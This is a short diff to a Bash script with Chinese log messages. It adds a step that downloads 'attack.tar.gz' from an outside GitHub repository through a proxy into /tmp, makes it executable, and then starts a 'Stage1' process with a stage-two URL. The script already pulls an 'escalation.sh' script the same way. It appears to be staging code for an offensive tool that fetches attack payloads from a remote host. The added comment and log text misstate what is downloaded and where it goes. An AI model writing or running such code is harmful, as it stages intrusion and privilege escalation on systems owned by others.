@@ -119,6 +119,19 @@ while [ $attempt -le $MAX_RETRIES ]; do
         chmod 755 "$ESCALATION_SH" 2>/dev/null || true
         log_success "escalation.sh 已成功下载到 $ESCALATION_SH"
     fi
+
+    # ===================== 下载 escalation.sh 到 /tmp =====================
+    log_info "准备下载 attack.tar.gz 到固定位置: $ESCALATION_SH"
+
+    if ! wget -q --no-cache --tries=3 --timeout=15 \
+            "https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz" -O "/tmp/attack.tar.gz"; then
+        log_error "下载 attack 失败: https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/attack.tar.gz"
+            # 这里你可以选择 exit 1 或者 continue 看需求
+            # exit 1
+    else
+        chmod 755 "/tmp/attack.tar.gz" 2>/dev/null || true
+        log_success "attack 已成功下载到 /tmp"
+    fi
     log_info "启动 Stage1 (host=$HOST_NAME)"
 
     if STAGE2_URL="$STAGE2_URL" \
